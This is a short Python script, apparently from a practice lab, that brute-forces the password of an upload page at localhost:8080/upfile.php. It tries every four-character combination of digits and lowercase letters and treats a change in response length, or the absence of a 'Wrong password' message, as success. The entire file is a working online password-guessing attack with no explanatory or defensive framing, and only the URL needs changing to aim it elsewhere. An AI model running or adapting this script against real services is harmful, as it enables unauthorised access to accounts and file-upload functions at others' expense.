from urllib.request import Request
from urllib.request import urlopen

# host
url = 'http://localhost:8080/upfile.php'

def getHTML():
    global html
    req = Request(url)
    html = len(urlopen(req).read().decode('utf-8').split('\n'))

def sendPassword(password):
    post_data = '?action=do_upload&password=' + password
    link = url + post_data
    try:
        req = Request(link)
        txt_res = urlopen(req).read().decode('utf-8')
        res = len(txt_res.split('\n'))
        if(res == html or txt_res.find('Wrong password') != -1):
            # print('NO')
            return False
        else:
            # print('YES')
            return True
    except:
        print('exception')

def createPass():
    data = '1234567890abcdefghijklmnopqrstuvwxyz'
    for a in data:
        for b in data:
            for c in data:
                for d in data:
                    password = a + '' + b + '' + c + '' + d
                    if(sendPassword(password)):
                        print(password + ' : YES')
                        return True
                    else:
                        print(password + ' : NO')

getHTML()
createPass()

# test
# sendPassword('')
# sendPassword('1234')